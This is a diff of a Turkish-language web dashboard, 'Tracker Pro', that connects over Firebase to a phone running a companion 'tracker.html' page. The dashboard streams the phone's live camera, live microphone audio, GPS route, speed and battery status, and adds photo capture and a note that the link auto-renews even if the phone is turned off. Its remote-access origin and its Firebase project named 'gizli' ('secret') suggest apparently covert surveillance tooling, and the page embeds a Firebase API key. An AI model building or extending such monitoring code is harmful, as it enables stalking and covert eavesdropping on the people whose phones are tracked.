@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🖥️ Uzaktan Erişim - Kontrol Paneli</title>
+    <title>🖥️ Tracker Pro - Kontrol Merkezi</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -13,7 +13,7 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: #0a0a0f;
+            background: #08080f;
             color: #fff;
             height: 100vh;
             overflow: hidden;
@@ -21,149 +21,179 @@
 
         .app {
             display: grid;
-            grid-template-columns: 400px 1fr;
+            grid-template-columns: 420px 1fr;
             height: 100vh;
         }
 
         /* Sidebar */
         .sidebar {
-            background: #12121a;
-            border-right: 1px solid rgba(255,255,255,0.1);
+            background: linear-gradient(180deg, #0f0f1a 0%, #12121f 100%);
+            border-right: 1px solid rgba(255,255,255,0.06);
             display: flex;
             flex-direction: column;
             overflow: hidden;
         }
 
         .sidebar-header {
-            padding: 24px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 14px;
-            margin-bottom: 24px;
+            gap: 12px;
+            margin-bottom: 20px;
         }
 
         .logo-icon {
-            width: 50px; height: 50px;
+            width: 46px; height: 46px;
             background: linear-gradient(135deg, #00d9ff, #00ff88);
-            border-radius: 14px;
+            border-radius: 12px;
             display: flex; align-items: center; justify-content: center;
-            font-size: 24px;
+            font-size: 22px;
+            box-shadow: 0 4px 20px rgba(0, 217, 255, 0.3);
         }
 
-        .logo h1 { font-size: 1.3rem; font-weight: 600; }
-        .logo p { font-size: 0.8rem; color: #666; }
+        .logo-text h1 { font-size: 1.2rem; font-weight: 600; }
+        .logo-text p { font-size: 0.75rem; color: #666; }
 
         .connect-box {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 14px;
-            padding: 20px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 16px;
         }
 
         .connect-box label {
-            display: block; font-size: 0.75rem;
+            display: block; font-size: 0.7rem;
             text-transform: uppercase; letter-spacing: 1px;
-            color: #666; margin-bottom: 10px;
+            color: #00ff88; margin-bottom: 8px;
         }
 
-        .input-row { display: flex; gap: 10px; }
+        .input-row { display: flex; gap: 8px; }
 
         .connect-box input {
-            flex: 1; padding: 14px 16px;
+            flex: 1; padding: 12px 14px;
             background: rgba(0,0,0,0.4);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 10px;
-            color: #fff; font-size: 1.1rem;
-            text-align: center; letter-spacing: 3px;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 8px;
+            color: #fff; font-size: 1rem;
+            text-align: center; letter-spacing: 2px;
             text-transform: uppercase;
         }
 
         .connect-box input:focus { outline: none; border-color: #00ff88; }
 
         .btn {
-            padding: 14px 20px;
-            border: none; border-radius: 10px;
+            padding: 12px 18px;
+            border: none; border-radius: 8px;
             font-weight: 600; cursor: pointer;
             transition: all 0.2s;
+            font-size: 0.85rem;
         }
 
         .btn-connect {
             background: linear-gradient(135deg, #00ff88, #00d9ff);
-            color: #0a0a0f;
+            color: #08080f;
         }
 
         .btn-connect:hover {
-            transform: translateY(-2px);
+            transform: translateY(-1px);
             box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
         }
 
-        /* Durum */
+        /* Status Section */
         .status-section {
-            padding: 20px 24px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding: 16px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
         }
 
         .status-card {
-            display: flex; align-items: center; gap: 14px;
-            padding: 16px;
-            background: rgba(255,255,255,0.03);
-            border-radius: 12px;
+            display: flex; align-items: center; gap: 12px;
+            padding: 14px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.06);
         }
 
         .status-dot {
             width: 14px; height: 14px;
             border-radius: 50%;
-            background: #444;
+            background: #333;
+            position: relative;
+            flex-shrink: 0;
         }
 
         .status-dot.online {
             background: #00ff88;
-            box-shadow: 0 0 15px #00ff88;
-            animation: pulse 2s infinite;
+            box-shadow: 0 0 12px #00ff88;
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        .status-dot.online::after {
+            content: '';
+            position: absolute;
+            width: 100%; height: 100%;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: ping 1.5s infinite;
+        }
+
+        @keyframes ping {
+            0% { transform: scale(1); opacity: 0.8; }
+            100% { transform: scale(2.5); opacity: 0; }
         }
 
         .status-info { flex: 1; }
-        .status-info strong { display: block; margin-bottom: 2px; }
-        .status-info span { font-size: 0.8rem; color: #666; }
+        .status-info strong { display: block; font-size: 0.9rem; margin-bottom: 2px; }
+        .status-info span { font-size: 0.75rem; color: #666; }
 
-        .status-battery {
-            font-size: 1.1rem; font-weight: 600; color: #00ff88;
+        .status-badges { display: flex; gap: 6px; flex-wrap: wrap; }
+
+        .badge {
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 600;
         }
 
-        /* Kamera + Ses Bölümü */
+        .badge.battery { background: rgba(0, 255, 136, 0.15); color: #00ff88; }
+        .badge.battery.low { background: rgba(255, 77, 77, 0.15); color: #ff4d4d; }
+        .badge.moving { background: rgba(255, 200, 0, 0.15); color: #ffc800; animation: pulse 1s infinite; }
+        .badge.still { background: rgba(0, 217, 255, 0.15); color: #00d9ff; }
+        .badge.uptime { background: rgba(138, 43, 226, 0.15); color: #9370db; }
+
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+
+        /* Media Section */
         .media-section {
-            padding: 20px 24px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding: 16px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
         }
 
         .section-title {
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             text-transform: uppercase;
             letter-spacing: 1px;
-            color: #666;
-            margin-bottom: 12px;
+            color: #00ff88;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
+        }
+
+        .camera-container {
+            position: relative;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #000;
+            margin-bottom: 10px;
         }
 
         .camera-feed {
             width: 100%;
             aspect-ratio: 4/3;
-            background: #000;
-            border-radius: 12px;
-            overflow: hidden;
             position: relative;
-            margin-bottom: 12px;
         }
 
         .camera-feed img {
@@ -171,72 +201,105 @@
             object-fit: cover;
         }
 
+        .camera-overlay {
+            position: absolute;
+            top: 8px; left: 8px; right: 8px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .camera-badge {
+            background: rgba(0,0,0,0.7);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            display: flex; align-items: center; gap: 4px;
+        }
+
+        .camera-badge.live { background: rgba(255, 77, 77, 0.9); }
+
+        .camera-badge.live::before {
+            content: '';
+            width: 6px; height: 6px;
+            background: #fff;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
         .camera-placeholder {
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            color: #444;
+            color: #333;
+            background: rgba(0,0,0,0.8);
         }
 
-        .camera-placeholder span { font-size: 48px; margin-bottom: 10px; }
+        .camera-placeholder span { font-size: 40px; margin-bottom: 8px; }
 
-        /* Ses Oynatıcı */
+        .capture-btn {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            width: 40px; height: 40px;
+            background: rgba(255,255,255,0.2);
+            border: 2px solid #fff;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .capture-btn:hover { background: #fff; color: #000; }
+
+        /* Audio Section */
         .audio-section {
-            background: rgba(0, 255, 136, 0.05);
-            border: 1px solid rgba(0, 255, 136, 0.2);
-            border-radius: 12px;
-            padding: 16px;
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 10px;
+            padding: 14px;
         }
 
         .audio-header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .audio-title {
             display: flex;
             align-items: center;
-            gap: 8px;
-            font-size: 0.9rem;
+            gap: 6px;
+            font-size: 0.85rem;
             font-weight: 500;
         }
 
-        .audio-status {
-            font-size: 0.75rem;
+        .audio-level-badge {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+            background: rgba(0, 255, 136, 0.15);
             color: #00ff88;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .audio-status .live-dot {
-            width: 8px; height: 8px;
-            background: #00ff88;
-            border-radius: 50%;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
         }
 
         .audio-controls {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
 
         .audio-btn {
-            width: 50px; height: 50px;
+            width: 44px; height: 44px;
             background: linear-gradient(135deg, #00ff88, #00d9ff);
             border: none;
             border-radius: 50%;
-            color: #0a0a0f;
-            font-size: 20px;
+            color: #08080f;
+            font-size: 18px;
             cursor: pointer;
             display: flex;
             align-items: center;
@@ -249,25 +312,22 @@
             box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
         }
 
-        .audio-btn:disabled {
-            background: #333;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
+        .audio-btn.playing { background: #ff4d4d; }
+        .audio-btn:disabled { background: #333; cursor: not-allowed; transform: none; box-shadow: none; }
 
         .audio-visualizer {
             flex: 1;
-            height: 40px;
+            height: 36px;
             display: flex;
-            align-items: center;
+            align-items: flex-end;
             justify-content: center;
-            gap: 3px;
+            gap: 2px;
+            padding: 0 10px;
         }
 
         .audio-bar {
-            width: 4px;
-            background: #00ff88;
+            width: 3px;
+            background: linear-gradient(to top, #00ff88, #00d9ff);
             border-radius: 2px;
             transition: height 0.1s;
         }
@@ -275,124 +335,295 @@
         .volume-control {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
+            font-size: 0.8rem;
         }
 
         .volume-control input[type="range"] {
-            width: 80px;
+            width: 70px;
             height: 4px;
             -webkit-appearance: none;
-            background: rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.15);
             border-radius: 2px;
         }
 
         .volume-control input[type="range"]::-webkit-slider-thumb {
             -webkit-appearance: none;
-            width: 14px; height: 14px;
+            width: 12px; height: 12px;
             background: #00ff88;
             border-radius: 50%;
             cursor: pointer;
         }
 
-        /* Konum Bilgileri */
-        .location-section {
-            padding: 20px 24px;
+        /* Stats Section */
+        .stats-section {
+            padding: 16px 20px;
             flex: 1;
             overflow-y: auto;
         }
 
-        .info-grid {
+        .stats-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            margin-bottom: 12px;
         }
 
-        .info-item {
-            background: rgba(255,255,255,0.03);
+        .stat-item {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.06);
             border-radius: 10px;
-            padding: 14px;
+            padding: 12px;
             text-align: center;
         }
 
-        .info-item label {
-            display: block; font-size: 0.65rem;
-            text-transform: uppercase; color: #555;
+        .stat-item.highlight {
+            background: rgba(0, 255, 136, 0.05);
+            border-color: rgba(0, 255, 136, 0.15);
+        }
+
+        .stat-item label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #555;
             margin-bottom: 4px;
         }
 
-        .info-item span {
+        .stat-item .value {
             font-family: 'SF Mono', monospace;
-            font-size: 0.9rem; color: #00ff88;
+            font-size: 1rem;
+            color: #00ff88;
+            font-weight: 600;
         }
 
-        /* Ana içerik - Harita */
+        .stat-item .value.large { font-size: 1.4rem; }
+        .stat-item .unit { font-size: 0.65rem; color: #555; margin-top: 2px; }
+
+        /* Connection Stats */
+        .connection-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .conn-stat {
+            text-align: center;
+            padding: 10px;
+            background: rgba(138, 43, 226, 0.05);
+            border-radius: 8px;
+        }
+
+        .conn-stat .value {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #9370db;
+        }
+
+        .conn-stat .label {
+            font-size: 0.6rem;
+            color: #666;
+            text-transform: uppercase;
+        }
+
+        /* History Section */
+        .history-section { margin-top: 12px; }
+
+        .history-list {
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .history-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 8px;
+            margin-bottom: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .history-item:hover { background: rgba(0, 255, 136, 0.1); }
+
+        .history-time {
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: #00ff88;
+        }
+
+        .history-coords {
+            font-size: 0.75rem;
+            color: #666;
+        }
+
+        /* Main Content - Map */
         .main-content { position: relative; }
 
         #map { width: 100%; height: 100%; }
 
-        .leaflet-container { background: #0a0a0f; }
+        .leaflet-container { background: #08080f; }
 
+        /* Map Overlay */
         .map-overlay {
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(10, 10, 15, 0.95);
-            display: flex; align-items: center; justify-content: center;
+            background: rgba(8, 8, 15, 0.98);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             z-index: 1000;
         }
 
         .map-overlay.hidden { display: none; }
 
-        .overlay-content { text-align: center; max-width: 400px; }
+        .overlay-content {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+        }
 
         .overlay-icon {
-            width: 100px; height: 100px;
+            width: 90px; height: 90px;
             background: rgba(0, 255, 136, 0.1);
             border: 2px solid #00ff88;
             border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 48px;
-            animation: ring 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            position: relative;
         }
 
-        @keyframes ring {
-            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
-            70% { box-shadow: 0 0 0 30px rgba(0, 255, 136, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
+        .overlay-icon::after {
+            content: '';
+            position: absolute;
+            width: 100%; height: 100%;
+            border: 2px solid #00ff88;
+            border-radius: 50%;
+            animation: ripple 2s infinite;
         }
 
-        .overlay-content h2 { font-size: 1.5rem; margin-bottom: 12px; }
-        .overlay-content p { color: #666; line-height: 1.8; }
+        @keyframes ripple {
+            0% { transform: scale(1); opacity: 0.8; }
+            100% { transform: scale(1.8); opacity: 0; }
+        }
+
+        .overlay-content h2 { font-size: 1.3rem; margin-bottom: 10px; }
+        .overlay-content p { color: #666; line-height: 1.7; font-size: 0.9rem; }
         .overlay-content strong { color: #00ff88; }
 
+        /* Map Controls */
         .map-controls {
             position: absolute;
-            top: 20px; right: 20px;
-            display: flex; flex-direction: column;
-            gap: 8px; z-index: 500;
+            top: 16px; right: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            z-index: 500;
         }
 
         .map-btn {
-            width: 46px; height: 46px;
-            background: #12121a;
+            width: 42px; height: 42px;
+            background: rgba(15, 15, 26, 0.9);
             border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
-            color: #888; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 20px;
+            border-radius: 10px;
+            color: #888;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
             transition: all 0.2s;
+            backdrop-filter: blur(10px);
         }
 
         .map-btn:hover {
             background: #00ff88;
-            color: #0a0a0f;
+            color: #08080f;
             border-color: #00ff88;
+        }
+
+        /* Map Info Box */
+        .map-info {
+            position: absolute;
+            bottom: 16px; left: 16px;
+            background: rgba(15, 15, 26, 0.9);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 14px 18px;
+            backdrop-filter: blur(10px);
+            z-index: 500;
+            min-width: 220px;
+        }
+
+        .map-info-title {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            color: #00ff88;
+            margin-bottom: 8px;
+        }
+
+        .map-info-value {
+            font-size: 0.85rem;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .map-info-detail {
+            font-size: 0.75rem;
+            color: #666;
+        }
+
+        /* Heartbeat Indicator */
+        .heartbeat-indicator {
+            position: absolute;
+            bottom: 16px;
+            right: 16px;
+            background: rgba(15, 15, 26, 0.9);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            padding: 10px 14px;
+            backdrop-filter: blur(10px);
+            z-index: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .heartbeat-indicator.hidden { display: none; }
+
+        .heartbeat-dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: heartbeat 1s infinite;
+        }
+
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+
+        .heartbeat-indicator span {
+            font-size: 0.75rem;
+            color: #888;
         }
 
         /* Custom Marker */
         .custom-marker { background: none; border: none; }
 
-        .marker-wrapper { width: 50px; height: 50px; position: relative; }
+        .marker-wrapper {
+            width: 50px; height: 50px;
+            position: relative;
+        }
 
         .marker-pulse {
             position: absolute;
@@ -412,21 +643,31 @@
             position: absolute;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            width: 20px; height: 20px;
+            width: 18px; height: 18px;
             background: #00ff88;
-            border: 3px solid white;
+            border: 3px solid #fff;
             border-radius: 50%;
-            box-shadow: 0 2px 15px rgba(0,0,0,0.5);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
         }
 
         /* Responsive */
-        @media (max-width: 900px) {
+        @media (max-width: 1000px) {
             .app {
                 grid-template-columns: 1fr;
                 grid-template-rows: auto 1fr;
             }
-            .sidebar { max-height: 50vh; overflow-y: auto; }
+            .sidebar {
+                max-height: 45vh;
+                overflow-y: auto;
+            }
+            .stats-section { display: none; }
         }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #555; }
     </style>
 </head>
 <body>
@@ -435,16 +676,16 @@
             <div class="sidebar-header">
                 <div class="logo">
                     <div class="logo-icon">🖥️</div>
-                    <div>
-                        <h1>Uzaktan Erişim</h1>
-                        <p>Telefon Kontrol Paneli</p>
+                    <div class="logo-text">
+                        <h1>Tracker Pro</h1>
+                        <p>Kontrol Merkezi v3.0</p>
                     </div>
                 </div>
 
                 <div class="connect-box">
-                    <label>Bağlantı Kodu</label>
+                    <label>🔗 Bağlantı Kodu</label>
                     <div class="input-row">
-                        <input type="text" id="codeInput" placeholder="abc123" maxlength="8">
+                        <input type="text" id="codeInput" placeholder="Kod girin" maxlength="12">
                         <button class="btn btn-connect" id="connectBtn">Bağlan</button>
                     </div>
                 </div>
@@ -455,44 +696,41 @@
                     <div class="status-dot" id="statusDot"></div>
                     <div class="status-info">
                         <strong id="statusText">Bağlantı Bekleniyor</strong>
-                        <span id="statusTime">--:--</span>
+                        <span id="statusTime">--:--:--</span>
                     </div>
-                    <div class="status-battery" id="batteryDisplay">--%</div>
+                    <div class="status-badges">
+                        <span class="badge battery" id="batteryBadge">--%</span>
+                        <span class="badge still" id="motionBadge">🧍 Durağan</span>
+                        <span class="badge uptime" id="uptimeBadge">⏱️ 0dk</span>
+                    </div>
                 </div>
             </div>
 
             <div class="media-section">
-                <div class="section-title">📷 Kamera Görüntüsü</div>
-                <div class="camera-feed">
-                    <img id="cameraImage" src="" alt="Kamera" style="display: none;">
-                    <div class="camera-placeholder" id="cameraPlaceholder">
-                        <span>📷</span>
-                        <p>Kamera bekleniyor...</p>
+                <div class="section-title">📷 Canlı Kamera</div>
+                <div class="camera-container">
+                    <div class="camera-feed">
+                        <img id="cameraImage" src="" alt="Kamera" style="display: none;">
+                        <div class="camera-placeholder" id="cameraPlaceholder">
+                            <span>📷</span>
+                            <p>Kamera bekleniyor...</p>
+                        </div>
                     </div>
+                    <div class="camera-overlay">
+                        <div class="camera-badge live" id="liveBadge" style="display: none;">CANLI</div>
+                        <div class="camera-badge" id="cameraTime">--:--</div>
+                    </div>
+                    <button class="capture-btn" id="captureBtn" title="Fotoğraf Kaydet">📸</button>
                 </div>
 
                 <div class="audio-section">
                     <div class="audio-header">
                         <div class="audio-title">🎤 Canlı Ses</div>
-                        <div class="audio-status" id="audioStatus">
-                            <div class="live-dot"></div>
-                            <span>Bekleniyor</span>
-                        </div>
+                        <span class="audio-level-badge" id="audioLevelBadge">0 dB</span>
                     </div>
                     <div class="audio-controls">
-                        <button class="audio-btn" id="playAudioBtn" disabled title="Sesi Oynat">
-                            🔊
-                        </button>
-                        <div class="audio-visualizer" id="audioVisualizer">
-                            <div class="audio-bar" style="height: 10px;"></div>
-                            <div class="audio-bar" style="height: 15px;"></div>
-                            <div class="audio-bar" style="height: 20px;"></div>
-                            <div class="audio-bar" style="height: 12px;"></div>
-                            <div class="audio-bar" style="height: 18px;"></div>
-                            <div class="audio-bar" style="height: 25px;"></div>
-                            <div class="audio-bar" style="height: 15px;"></div>
-                            <div class="audio-bar" style="height: 10px;"></div>
-                        </div>
+                        <button class="audio-btn" id="playAudioBtn" disabled title="Sesi Dinle">🔊</button>
+                        <div class="audio-visualizer" id="audioVisualizer"></div>
                         <div class="volume-control">
                             <span>🔉</span>
                             <input type="range" id="volumeSlider" min="0" max="100" value="80">
@@ -501,25 +739,58 @@
                 </div>
             </div>
 
-            <div class="location-section">
+            <div class="stats-section">
                 <div class="section-title">📍 Konum Bilgileri</div>
-                <div class="info-grid">
-                    <div class="info-item">
+                <div class="stats-grid">
+                    <div class="stat-item highlight">
                         <label>Enlem</label>
-                        <span id="latDisplay">--</span>
+                        <div class="value" id="latDisplay">--</div>
                     </div>
-                    <div class="info-item">
+                    <div class="stat-item highlight">
                         <label>Boylam</label>
-                        <span id="lngDisplay">--</span>
+                        <div class="value" id="lngDisplay">--</div>
                     </div>
-                    <div class="info-item">
-                        <label>Hassasiyet</label>
-                        <span id="accDisplay">--</span>
-                    </div>
-                    <div class="info-item">
+                    <div class="stat-item">
                         <label>Hız</label>
-                        <span id="speedDisplay">--</span>
+                        <div class="value large" id="speedDisplay">0</div>
+                        <div class="unit">km/s</div>
                     </div>
+                    <div class="stat-item">
+                        <label>Mesafe</label>
+                        <div class="value large" id="distanceDisplay">0</div>
+                        <div class="unit">metre</div>
+                    </div>
+                    <div class="stat-item">
+                        <label>Hassasiyet</label>
+                        <div class="value" id="accDisplay">--</div>
+                        <div class="unit">metre</div>
+                    </div>
+                    <div class="stat-item">
+                        <label>Güncelleme</label>
+                        <div class="value" id="updateDisplay">0</div>
+                        <div class="unit">adet</div>
+                    </div>
+                </div>
+
+                <!-- Bağlantı İstatistikleri -->
+                <div class="connection-stats">
+                    <div class="conn-stat">
+                        <div class="value" id="reconnectDisplay">0</div>
+                        <div class="label">Yeniden Bağ.</div>
+                    </div>
+                    <div class="conn-stat">
+                        <div class="value" id="dataDisplay">0</div>
+                        <div class="label">KB Alındı</div>
+                    </div>
+                    <div class="conn-stat">
+                        <div class="value" id="lastHeartbeat">--</div>
+                        <div class="label">Son Sinyal</div>
+                    </div>
+                </div>
+
+                <div class="history-section">
+                    <div class="section-title">📋 Konum Geçmişi</div>
+                    <div class="history-list" id="historyList"></div>
                 </div>
             </div>
         </aside>
@@ -534,7 +805,8 @@
                     <p>
                         1. Telefonunuzda <strong>tracker.html</strong> açın<br>
                         2. Bir bağlantı kodu girin<br>
-                        3. Aynı kodu buraya girin ve <strong>Bağlan</strong>'a tıklayın
+                        3. Aynı kodu buraya girin ve <strong>Bağlan</strong>'a tıklayın<br><br>
+                        <em style="color: #888;">💡 Telefon kapatılsa bile bağlantı otomatik yenilenir</em>
                     </p>
                 </div>
             </div>
@@ -543,12 +815,25 @@
                 <button class="map-btn" id="centerBtn" title="Konuma Git">🎯</button>
                 <button class="map-btn" id="zoomInBtn" title="Yakınlaştır">➕</button>
                 <button class="map-btn" id="zoomOutBtn" title="Uzaklaştır">➖</button>
+                <button class="map-btn" id="clearRouteBtn" title="Rotayı Temizle">🗑️</button>
+                <button class="map-btn" id="followBtn" title="Takip Et">🔒</button>
+            </div>
+
+            <div class="map-info" id="mapInfo" style="display: none;">
+                <div class="map-info-title">📍 Son Konum</div>
+                <div class="map-info-value" id="mapInfoCoords">--</div>
+                <div class="map-info-detail" id="mapInfoTime">--</div>
+            </div>
+
+            <div class="heartbeat-indicator hidden" id="heartbeatIndicator">
+                <div class="heartbeat-dot"></div>
+                <span id="heartbeatText">Bağlı</span>
             </div>
         </main>
     </div>
 
     <script>
-        // Firebase Config - GERÇEK PROJE
+        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyDR9gR5nhJ2Y2nNLBKwK7IiAr1_KVWjHSw",
             authDomain: "gizli-38804.firebaseapp.com",
@@ -562,7 +847,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        class Dashboard {
+        class AdvancedDashboard {
             constructor() {
                 this.map = null;
                 this.marker = null;
@@ -574,16 +859,34 @@
                 this.audioQueue = [];
                 this.isPlaying = false;
                 this.volume = 0.8;
+                this.followMode = false;
+                this.dataReceived = 0;
+                this.lastHeartbeat = null;
+                this.startTime = null;
 
+                this.createAudioBars();
                 this.init();
+            }
+
+            createAudioBars() {
+                const container = document.getElementById('audioVisualizer');
+                for (let i = 0; i < 20; i++) {
+                    const bar = document.createElement('div');
+                    bar.className = 'audio-bar';
+                    bar.style.height = '5px';
+                    container.appendChild(bar);
+                }
             }
 
             init() {
                 this.initMap();
                 this.bindEvents();
 
-                const saved = localStorage.getItem('dashboard_code');
+                const saved = localStorage.getItem('dashboard_code_v3');
                 if (saved) document.getElementById('codeInput').value = saved;
+
+                // Connection check interval
+                setInterval(() => this.checkConnection(), 10000);
             }
 
             initMap() {
@@ -602,7 +905,7 @@
                 this.polyline = L.polyline([], {
                     color: '#00ff88',
                     weight: 3,
-                    opacity: 0.7
+                    opacity: 0.8
                 }).addTo(this.map);
             }
 
@@ -615,22 +918,35 @@
                 document.getElementById('centerBtn').addEventListener('click', () => this.centerMap());
                 document.getElementById('zoomInBtn').addEventListener('click', () => this.map.zoomIn());
                 document.getElementById('zoomOutBtn').addEventListener('click', () => this.map.zoomOut());
+                document.getElementById('clearRouteBtn').addEventListener('click', () => this.clearRoute());
+                document.getElementById('followBtn').addEventListener('click', () => this.toggleFollow());
 
                 document.getElementById('playAudioBtn').addEventListener('click', () => this.toggleAudio());
                 document.getElementById('volumeSlider').addEventListener('input', (e) => {
                     this.volume = e.target.value / 100;
                 });
+
+                document.getElementById('captureBtn').addEventListener('click', () => this.capturePhoto());
+            }
+
+            toggleFollow() {
+                this.followMode = !this.followMode;
+                const btn = document.getElementById('followBtn');
+                btn.textContent = this.followMode ? '🔓' : '🔒';
+                btn.style.background = this.followMode ? '#00ff88' : '';
+                btn.style.color = this.followMode ? '#08080f' : '';
             }
 
             connect() {
                 this.code = document.getElementById('codeInput').value.trim().toLowerCase();
 
-                if (!this.code) {
-                    alert('Lütfen bağlantı kodunu girin.');
+                if (!this.code || this.code.length < 6) {
+                    alert('Lütfen en az 6 karakterlik bağlantı kodu girin.');
                     return;
                 }
 
-                localStorage.setItem('dashboard_code', this.code);
+                localStorage.setItem('dashboard_code_v3', this.code);
+                this.startTime = Date.now();
 
                 this.listeners.forEach(ref => ref.off());
                 this.listeners = [];
@@ -640,34 +956,72 @@
                 document.getElementById('connectBtn').textContent = 'Bağlanıyor...';
             }
 
+            checkConnection() {
+                if (!this.isConnected || !this.lastHeartbeat) return;
+
+                const timeSince = Date.now() - this.lastHeartbeat;
+                const seconds = Math.floor(timeSince / 1000);
+
+                document.getElementById('lastHeartbeat').textContent = seconds + 's';
+
+                if (timeSince > 60000) {
+                    // 1 dakikadan fazla sinyal yoksa
+                    this.updateConnectionStatus(false);
+                }
+            }
+
             listenToDevice() {
                 const deviceRef = db.ref('devices/' + this.code);
 
-                // Durum
+                // Status
                 const statusRef = deviceRef.child('status');
                 statusRef.on('value', (snap) => {
-                    const status = snap.val();
-                    this.updateConnectionStatus(status === 'online');
+                    this.updateConnectionStatus(snap.val() === 'online');
                 });
                 this.listeners.push(statusRef);
 
-                // Konum
+                // Heartbeat
+                const heartbeatRef = deviceRef.child('heartbeat');
+                heartbeatRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) {
+                        this.lastHeartbeat = Date.now();
+                        document.getElementById('lastHeartbeat').textContent = '0s';
+                        
